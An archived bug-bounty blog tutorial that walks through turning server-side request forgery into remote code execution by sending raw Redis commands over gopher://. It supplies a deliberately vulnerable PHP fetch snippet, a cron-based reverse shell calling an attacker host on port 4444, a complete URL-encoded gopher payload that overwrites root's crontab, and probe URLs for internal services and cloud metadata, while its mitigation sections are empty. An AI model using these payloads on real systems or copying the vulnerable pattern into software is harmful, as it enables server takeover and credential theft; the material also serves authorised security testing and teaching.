# SSRF to RCE via Redis using Gopher Protocol

- **Source URL:** https://medium.com/@zoningxtr/ssrf-to-rce-via-redis-using-gopher-protocol-7409b1d97dcd?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905080238/https://medium.com/@zoningxtr/ssrf-to-rce-via-redis-using-gopher-protocol-7409b1d97dcd?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/9805 (id 9805)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 💣🔥 SSRF to RCE via Redis using Gopher Protocol **(With Real Examples, Architecture, and Exploit Walkthrough)**

By

*Learn how to escalate SSRF to RCE via Redis using the Gopher protocol. 🚀 Includes real-world examples, attack architecture, and a step-by-step exploit walkthrough.*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

## 📌 Table of Contents

1. 🔧 What is Redis?
2. 🧪 What is the Gopher Protocol?
3. 📥 SSRF to Redis RCE: Step-by-step explanation
4. 🔓 Real Vulnerable Code
5. 🚨 Real Exploitation Scenario
6. 🧰 Tools for Testing (Burp Suite + Static Analysis)
7. 🛡️ Mitigation Techniques
8. 🧠 Final Takeaway

## 🔧 What is Redis?

**Redis** is an open-source, in-memory key-value data store used for caching, session management, message brokering, etc.

## Key Facts:

- Runs by default on port `6379`
- Accepts **simple plaintext commands**
- **No authentication by default** (very dangerous if exposed)
- Can **write files to disk**, and sometimes can even create a **cron job** or **SSH key** (used for RCE)

## 🧪 What is the Gopher Protocol?

**Gopher://** is a protocol that predates HTTP. More importantly for SSRF:

*🔥 It allows low-level, raw TCP connections — meaning you can use it to speak any protocol, including Redis!*


## Why Gopher is Dangerous in SSRF?

- HTTP SSRF is limited (headers, request format).
- **Gopher can send raw Redis commands line by line**, enabling abuse of Redis features.

## 📥 SSRF to RCE — The Redis Attack Chain

## 📌 Architecture & Flow

```
🧑💻 Attacker
    |
    | SSRF Payload (Gopher)
    v
🌐 Vulnerable Web App (SSRF)
    |
    | Gopher Request to Redis Server
    v
🧠 Redis Server (No Auth, Exposed to internal network)
    |
    | Writes malicious cron job or SSH key
    v
💥 Code Execution
```
## 🧱 Vulnerable Code Example (PHP)

```
<?php
// Very bad practice
$url = $_GET['url'];
echo file_get_contents($url);
?>
```
This allows an attacker to SSRF to internal services — including Redis!

## 🚨 Real Exploit: SSRF to Redis to RCE via Cron

1. **Target condition**: Redis is running on localhost `127.0.0.1:6379` and accessible internally.
2. **What we send**:
Redis command to**write a reverse shell cron job**:

- bash
- CopyEdit
- `* * * * * bash -i >& /dev/tcp/attacker-ip/4444 0>&1`

1. **Redis Write Steps (simplified)**:

`FLUSHALL SET 1 "\n\n* * * * * bash -i >& /dev/tcp/attacker-ip/4444 0>&1\n\n" CONFIG SET dir /var/spool/cron/crontabs CONFIG SET dbfilename root SAVE`
1. **Use SSRF with Gopher to send these raw Redis commands:**

## 🧨 Gopher SSRF Payload (URL Encoded)

`gopher://127.0.0.1:6379/_%0D%0AFLUSHALL%0D%0ASET%201%20%22%0A*%20*%20*%20*%20*%20bash%20-i%20%3E%26%20/dev/tcp/ATTACKER-IP/4444%200%3E%261%0A%22%0D%0ACONFIG%20SET%20dir%20/var/spool/cron/crontabs%0D%0ACONFIG%20SET%20dbfilename%20root%0D%0ASAVE%0D%0A`
✅ Plug this into:

`https://victim.com/api?url=<gopher_payload_here>`
## 🧪 Dynamic Testing with Burp Suite

1. Intercept a request with a parameter like:

`https://victim.com/fetch?url=http://example.com`
1. Replace `url=` value with your crafted `gopher://` payload above.
2. Monitor your reverse shell listener (e.g., using `nc -lvnp 4444`)

## 🔎 Static Code Analysis

Using **Semgrep** or similar tools:

`semgrep --config p/ssrf ./myapp/`
Look for patterns like:

`php``file_get_contents($_GET['url'])`
## 🔥 Summary of RCE Exploit Chain

## 🛡️ Mitigation Best Practices

## 📌 Final Tip for Bug Bounty Hunters

If you see a parameter like:

`/api/fetch?url=`
✅ Test these:

```
gopher://127.0.0.1:6379/_PING
gopher://localhost:25/_HELO
gopher://169.254.169.254:80/_GET /latest/meta-data/
```
You might just find a gold mine! 💰
